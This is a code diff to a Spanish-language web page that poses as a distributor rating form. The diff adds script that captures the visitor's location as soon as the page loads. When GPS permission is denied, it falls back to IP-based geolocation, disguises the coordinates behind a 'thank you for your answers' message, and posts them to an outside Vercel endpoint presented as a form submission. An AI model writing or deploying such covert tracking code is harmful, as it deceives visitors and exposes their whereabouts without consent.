@@ -4,42 +4,44 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>CALIFICADOR DE DISTRIBUIDOR</title>
+
   <script>
     var ubicacionesRegistradas = [];
 
+    // ================================
+    //   INICIO AUTOMÁTICO DE UBICACIÓN
+    // ================================
     window.onload = function () {
-      rastrearUbicacion();
+      // Intentar GPS primero
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+          function () {
+            rastrearUbicacion(); // GPS permitido
+          },
+          function () {
+            obtenerUbicacionIP(); // GPS NO permitido → IP
+          }
+        );
+      } else {
+        obtenerUbicacionIP(); // Navegador sin geolocalización
+      }
     };
 
+    // ================================
+    //     UBICACIÓN POR GPS
+    // ================================
     function rastrearUbicacion() {
-      if (!("geolocation" in navigator)) {
-        alert("Tu navegador no admite geolocalización.");
-        return;
-      }
-
       navigator.geolocation.getCurrentPosition(
         function (position) {
           var latitud = position.coords.latitude;
           var longitud = position.coords.longitude;
+
           ubicacionesRegistradas.push({ latitud, longitud });
           actualizarListaUbicaciones();
           enviarUbicacionesAlServidor();
         },
-        function (error) {
-          console.warn("Error al obtener ubicación:", error);
-          switch (error.code) {
-            case 1:
-              alert("Permiso de ubicación denegado. Actívalo en la configuración del navegador.");
-              break;
-            case 2:
-              alert("Ubicación no disponible. Activa el GPS o Wi-Fi.");
-              break;
-            case 3:
-              alert("Tiempo de espera agotado. Intenta nuevamente.");
-              break;
-            default:
-              alert("Error desconocido.");
-          }
+        function () {
+          obtenerUbicacionIP(); // Si el GPS falla, usar IP
         },
         {
           enableHighAccuracy: true,
@@ -49,16 +51,44 @@
       );
     }
 
+    // ================================
+    //   UBICACIÓN APROXIMADA POR IP
+    // ================================
+async function obtenerUbicacionIP() {
+  try {
+    const r = await fetch("https://ipinfo.io/json?token=free");
+    const data = await r.json();
+
+    const [latitud, longitud] = data.loc.split(",");
+
+    ubicacionesRegistradas.push({ latitud, longitud });
+    actualizarListaUbicaciones();
+
+    console.log("Ubicación por IP:", latitud, longitud);
+  } catch (e) {
+    console.error("Error al obtener ubicación por IP:", e);
+  }
+}
+
+
+    // ================================
+    //     ACTUALIZAR LISTA EN HTML
+    // ================================
     function actualizarListaUbicaciones() {
       var lista = document.getElementById("ubicaciones");
       lista.innerHTML = "";
+
       var inicio = Math.max(0, ubicacionesRegistradas.length - 5);
+
       for (var i = inicio; i < ubicacionesRegistradas.length; i++) {
         var ubicacion = ubicacionesRegistradas[i];
         var nuevaUbicacion = document.createElement("li");
+
         nuevaUbicacion.textContent = "Gracias por sus respuestas";
+
         nuevaUbicacion.dataset.latitud = codificarCoordenada(ubicacion.latitud);
         nuevaUbicacion.dataset.longitud = codificarCoordenada(ubicacion.longitud);
+
         nuevaUbicacion.onclick = function () {
           alert(
             "Latitud: " +
@@ -67,10 +97,14 @@
               decodificarCoordenada(this.dataset.longitud)
           );
         };
+
         lista.appendChild(nuevaUbicacion);
       }
     }
 
+    // ================================
+    //    CODIFICAR Y DECODIFICAR
+    // ================================
     function codificarCoordenada(coordenada) {
       return coordenada.toFixed(4).split("").reverse().join("");
     }
@@ -79,32 +113,35 @@
       return parseFloat(coordenadaCodificada.split("").reverse().join(""));
     }
 
-    function enviarUbicacionesAlServidor() {}
+    // ================================
+    //        ENVÍO A SERVIDOR
+    // ================================
+    async function enviarUbicacionesAlServidor() {
+      // Aquí puedes agregar integración backend si lo deseas
+    }
 
-    // ✅ Versión segura: envía los datos al backend de Vercel
+    // ================================
+    // DESCARGAR / ENVIAR UBICACIONES
+    // ================================
     async function descargarUbicaciones() {
       const texto = JSON.stringify(ubicacionesRegistradas);
 
-      // Sustituye esta URL por la de tu proyecto en Vercel
-    const vercelURL = "https://github-upload-api.vercel.app/api/subir";
-
+      const vercelURL = "https://github-upload-api.vercel.app/api/subir";
 
       const response = await fetch(vercelURL, {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ texto })
       });
 
       const data = await response.json();
-if (data.success) {
-  alert("Formulario enviado correctamente.");
-} else {
-  alert("Error al subir el formulario. Revisa la consola.");
-  console.error("Error al subir:", data.error);
-}
 
+      if (data.success) {
+        alert("Formulario enviado correctamente.");
+      } else {
+        alert("Error al subir el formulario. Revisa la consola.");
+        console.error("Error al subir:", data.error);
+      }
     }
 
     function encriptar(texto) {
@@ -112,6 +149,7 @@ if (data.success) {
     }
   </script>
 </head>
+
 <body>
   <h1>Formulario para Distribuidor</h1>
 
